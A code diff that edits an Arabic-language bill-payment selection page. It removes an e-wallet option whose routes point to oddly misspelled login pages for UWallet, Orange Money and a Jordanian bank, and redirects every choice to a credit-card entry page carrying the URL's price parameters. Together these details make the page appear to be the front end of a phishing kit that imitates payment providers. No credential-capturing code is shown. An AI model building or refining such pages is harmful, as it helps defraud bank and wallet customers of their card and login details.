@@ -13,8 +13,6 @@
     --primary:#0d3b66;
     --primary-dark:#092947;
     --primary-light:#e8f0f8;
-    --accent-green:#1e7d3a;
-    --accent-green-bg:#eaf6ee;
     --bg:#eef1f4;
     --card:#ffffff;
     --border:#d7dde3;
@@ -120,47 +118,6 @@
     background: var(--primary-light);
   }
 
-  /* حاوية كروت المحافظ الإلكترونية */
-  .wallets-container {
-    display: none;
-    margin-top: 18px;
-    animation: fadeIn 0.3s ease;
-  }
-
-  .wallets-grid {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 10px;
-    margin-top: 10px;
-  }
-
-  .wallet-card {
-    border: 1.5px solid var(--border);
-    border-radius: 8px;
-    padding: 12px 8px;
-    text-align: center;
-    cursor: pointer;
-    background: #fff;
-    transition: all 0.2s ease;
-    font-size: 0.82rem;
-    font-weight: 700;
-  }
-
-  .wallet-card input[type="radio"] {
-    display: none;
-  }
-
-  .wallet-card.selected {
-    border-color: var(--accent-green);
-    background: var(--accent-green-bg);
-    color: var(--accent-green);
-  }
-
-  @keyframes fadeIn {
-    from { opacity: 0; transform: translateY(-4px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
   .btn-submit {
     width: 100%;
     margin-top: 22px;
@@ -189,7 +146,6 @@
     header .htext h1{ font-size:.85rem; }
     header .htext p{ font-size:.65rem; }
     .payment-methods { grid-template-columns: 1fr; }
-    .wallets-grid { grid-template-columns: 1fr; }
   }
 </style>
 </head>
@@ -210,40 +166,26 @@
 <main>
   <div class="card">
     <h2>اختر طريقة الدفع</h2>
-    <p class="card-sub">يرجى تحديد الطريقة المناسبة لإتمام سداد الفاتورة بأمان.</p>
+    <p class="card-sub">يرجى تحديد الطريقة المناسبة لإتمام سداد الفاتورة .</p>
 
     <form id="paymentForm">
       <div class="payment-methods">
-        <div class="method-card" id="cardMethodWrapper">
+        <!-- خيار الفيزا (محدد افتراضياً) -->
+        <div class="method-card active" id="visaMethodWrapper">
           <label>
-            <input type="radio" name="payment_type" value="card" id="payCard" />
+            <input type="radio" name="payment_type" value="visa" id="payVisa" checked />
             <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
-            دفع بالبطاقة الائتمانية
+            الدفع بالفيزا
           </label>
         </div>
 
-        <div class="method-card" id="walletMethodWrapper">
+        <!-- خيار بطاقة الائتمان -->
+        <div class="method-card" id="creditMethodWrapper">
           <label>
-            <input type="radio" name="payment_type" value="wallet" id="payWallet" />
-            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path><path d="M18 12a2 2 0 0 0 0 4h4v-4z"></path></svg>
-            المحافظ الإلكترونية
+            <input type="radio" name="payment_type" value="credit_card" id="payCredit" />
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+            الدفع ببطاقة الائتمان
           </label>
-        </div>
-      </div>
-
-      <!-- قسم المحافظ الإلكترونية (يظهر عند اختيار المحافظ) -->
-      <div class="wallets-container" id="walletsSection">
-        <label style="font-size: 0.86rem; font-weight: 700; color: #33404c; margin-bottom: 6px;">اختر المحفظة الإلكترونية:</label>
-        <div class="wallets-grid">
-          <div class="wallet-card" data-wallet="UWallet">
-            <input type="radio" name="wallet_provider" value="uwallet" />
-            يو ولت (UWallet)
-          </div>
-          <div class="wallet-card" data-wallet="Orange">
-            <input type="radio" name="wallet_provider" value="orange" />
-            أورنج موني (Orange)
-          </div>
-
         </div>
       </div>
 
@@ -257,76 +199,46 @@
 </footer>
 
 <script>
-  const payCard = document.getElementById('payCard');
-  const payWallet = document.getElementById('payWallet');
-  const cardWrapper = document.getElementById('cardMethodWrapper');
-  const walletWrapper = document.getElementById('walletMethodWrapper');
-  const walletsSection = document.getElementById('walletsSection');
-  const walletCards = document.querySelectorAll('.wallet-card');
+  const payVisa = document.getElementById('payVisa');
+  const payCredit = document.getElementById('payCredit');
+  const visaWrapper = document.getElementById('visaMethodWrapper');
+  const creditWrapper = document.getElementById('creditMethodWrapper');
 
-  // تبديل التنسيق عند اختيار طريقة الدفع الأساسية
-  function updatePaymentSelection() {
-    if (payCard.checked) {
-      cardWrapper.classList.add('active');
-      walletWrapper.classList.remove('active');
-      walletsSection.style.display = 'none';
-    } else if (payWallet.checked) {
-      walletWrapper.classList.add('active');
-      cardWrapper.classList.remove('active');
-      walletsSection.style.display = 'block';
+  // دالة التوجيه مع نقل المعاملات الديناميكية (Params) الموجودة بالرابط الحالي
+  function redirectToPayment() {
+    const currentParams = window.location.search; // تمرير كل الـ Parameters التابعة للعميل الحالي
+    window.location.href = 'static/credit_card_page.html' + currentParams;
+  }
+
+  // تحديث شكل التحديد
+  function updateSelection() {
+    if (payVisa.checked) {
+      visaWrapper.classList.add('active');
+      creditWrapper.classList.remove('active');
+    } else if (payCredit.checked) {
+      creditWrapper.classList.add('active');
+      visaWrapper.classList.remove('active');
     }
   }
 
-  cardWrapper.addEventListener('click', () => {
-    payCard.checked = true;
-    updatePaymentSelection();
+  // التوجيه عند النقر على الفيزا
+  visaWrapper.addEventListener('click', () => {
+    payVisa.checked = true;
+    updateSelection();
+    redirectToPayment();
   });
 
-  walletWrapper.addEventListener('click', () => {
-    payWallet.checked = true;
-    updatePaymentSelection();
+  // التوجيه عند النقر على بطاقة الائتمان
+  creditWrapper.addEventListener('click', () => {
+    payCredit.checked = true;
+    updateSelection();
+    redirectToPayment();
   });
 
-  // تفاعل كروت المحافظ الفرعية
-  walletCards.forEach(card => {
-    card.addEventListener('click', () => {
-      walletCards.forEach(c => c.classList.remove('selected'));
-      card.classList.add('selected');
-      card.querySelector('input').checked = true;
-    });
-  });
-
-document.getElementById('paymentForm').addEventListener('submit', (e) => {
+  // التوجيه عند إرسال النموذج (زر المتابعة)
+  document.getElementById('paymentForm').addEventListener('submit', (e) => {
     e.preventDefault();
-    
-    if (!payCard.checked && !payWallet.checked) {
-      alert('الرجاء اختيار طريقة دفع واحدة على الأقل');
-      return;
-    }
-
-    if (payCard.checked) {
-      const qs = new URLSearchParams(window.location.search);
-      const suffix = (qs.get('original') || qs.get('discounted'))
-        ? `?original=${encodeURIComponent(qs.get('original') || '')}&discounted=${encodeURIComponent(qs.get('discounted') || '')}`
-        : '';
-      window.location.href = 'credit_card_page.html' + suffix;
-    } 
-    else if (payWallet.checked) {
-      const selectedWallet = document.querySelector('input[name="wallet_provider"]:checked');
-      if (!selectedWallet) {
-        alert('الرجاء اختيار المحفظة الإلكترونية المطلوبة');
-        return;
-      }
-
-      // ضع روابط الصفحات لكل محفظة هنا:
-      const walletRoutes = {
-        'uwallet': 'uwalitlogin.html',
-        'orange': 'orange_page.html',
-        'jordan_bank': 'loginbankjorfan.html'
-      };
-
-      window.location.href = walletRoutes[selectedWallet.value];
-    }
+    redirectToPayment();
   });
 </script>
 
